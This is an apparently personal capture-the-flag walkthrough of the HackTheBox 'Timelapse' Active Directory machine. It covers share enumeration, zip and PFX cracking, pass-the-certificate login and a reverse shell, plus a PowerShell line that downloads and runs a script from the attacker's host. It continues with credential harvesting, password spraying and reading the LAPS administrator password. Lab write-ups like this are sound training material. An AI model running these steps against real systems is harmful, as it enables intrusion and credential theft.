---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Timelapse?tab=play_machine
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Timelapse-1791302139772.webp)
 
![](../../0.%20Assets/Timelapse-1791302148578.webp)
---

# Walkthrough




Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts -vvv
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -Pn -n -sVC --min-rate 5000 -oN results.txt -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692
```

```

PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-10-06 23:59:50Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp  open  ssl/wsmans?       syn-ack ttl 127
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:     e233 a199 4504 0859 013f b9c5 e4f6 91c3
| SHA-1:   5861 acf7 76b8 703f d01e e25d fc7c 9952 a447 7652
| SHA-256: ec04 c023 ef31 4e12 e299 0242 ef00 9045 7626 19ff 2c75 0f04 9779 0f98 118f e81d
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh
| lrrndm32+d0YeP/wb8E=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-10-07T00:01:19+00:00; +7h59m59s from scanner time.
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 38738/tcp): CLEAN (Timeout)
|   Check 2 (port 41782/tcp): CLEAN (Timeout)
|   Check 3 (port 43455/udp): CLEAN (Timeout)
|   Check 4 (port 21699/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-10-07T00:00:43
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```


After some enumeration, we can access a few shares as `Guest`.

```
netexec smb $T -u 'guest' -p '' --shares
```

![](../../0.%20Assets/Timelapse-1791302580600.webp)

Let's pull down everything.

```
netexec smb "$T" -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

![](../../0.%20Assets/Timelapse-1791302668914.webp)

When we try to unzip it, it asks for a password.

![](../../0.%20Assets/Timelapse-1791302697185.webp)

Let's convert the zip into a hash so we can crack it with `john`.

```
john --wordlist=rockyou.txt hash.txt
```

![](../../0.%20Assets/Timelapse-1791302780877.webp)

Now let's crack it.

```
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![](../../0.%20Assets/Timelapse-1791302808276.webp)

Once we unzip the file:

![](../../0.%20Assets/Timelapse-1791302930021.webp)

We find a `.pfx` key.

https://github.com/3ls3if/Cybersecurity-Notes/blob/main/readme/active-directory-pentesting/crendentials/pfx-file.md

I tried extracting the private key from the PFX file, but it needed a password, so let's crack that too.

![](../../0.%20Assets/Timelapse-1791303091222.webp)

```
pfx2john legacyy_dev_auth.pfx > pfx.hash

john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash
```

![](../../0.%20Assets/Timelapse-1791303114034.webp)

Now we can extract the private key.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out drlive.key
```

And the certificate.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out drlive.crt
```

![](../../0.%20Assets/Timelapse-1791304557362.webp)

Now we can perform a `pass the certificate`, which I think is a really neat technique, using evil-winrm. There's also a hint in the filename (winrm_backup...).

```
evil-winrm -i 10.129.227.113 -c drlive.crt -k drlive.key -S
```

![](../../0.%20Assets/Timelapse-1791309992531.webp)

And there's the first flag.

Typing the password every time gets tedious, so let's grab a reverse shell.

```
penelope -O -p 1337 -a -i tun0
```

This generates the PowerShell payload to catch the shell.

![](../../0.%20Assets/Timelapse-1791310070180.webp)

I'll run `PrivescCheck` and output HTML so we can download it and comfortably review the machine's privilege escalation surface.

```
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.226/PrivescCheck.ps1'); Invoke-Pri
vescCheck -Extended -Audit -Report PrivescCheck_Full -Format HTML"
```


![](../../0.%20Assets/Timelapse-1791311288443.webp)

Even the summary gives us a good idea of what to expect.

I'd recommend starting a Python server and opening the HTML file.

![](../../0.%20Assets/Timelapse-1791311620026.webp)

None of the results were especially critical or easily exploitable.

Going back over my notes, I tried a few things, and the PowerShell history was the one that paid off.

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![](../../0.%20Assets/Timelapse-1791312053448.webp)

```
E3R$Q62^12p7PLlC%KWaxuaV
```

We have a password, now we need users to test it against.

I found that the `Guest` user can `rid brute`.

```
netexec smb $T -u 'guest' -p '' --rid-brute 10000
```

![](../../0.%20Assets/Timelapse-1791304615265.webp)

```
nxc smb $T -u 'guest' -p '' --rid-brute 10000 | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![](../../0.%20Assets/Timelapse-1791304766309.webp)

```
nxc smb "$T" -u users.txt -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

![](../../0.%20Assets/Timelapse-1791312146694.webp)

Now we have a set of credentials. Let's see what they get us.

```
./nxcspray all $T -u 'svc_deploy'  -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

![](../../0.%20Assets/Timelapse-1791312235184.webp)

It looks like we can log in through `evil-winrm` over `ssl`.

```
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```


![](../../0.%20Assets/Timelapse-1791312362882.webp)

Running `whoami /all`, we see a dangerous group.

![](../../0.%20Assets/Timelapse-1791312419336.webp)

```
Get-ADComputer -Identity 'DC01' -property 'ms-mcs-admpwd'
```

![](../../0.%20Assets/Timelapse-1791312557049.webp)

Save this credential to a file and password spray it against the users we found earlier.

```
netexec winrm $T -u users.txt -p password.txt --continue-on-success
```


![](../../0.%20Assets/Timelapse-1791312619187.webp)

Connect with evil-winrm.

```
evil-winrm -i 10.129.227.113 -u administrator -p '6f+m%vqtbL6ZHr4%xfyHp206' -S
```

For some reason the flag wasn't on the administrator's desktop, but on the `TRX` user's.

![](../../0.%20Assets/Timelapse-1791312820510.webp)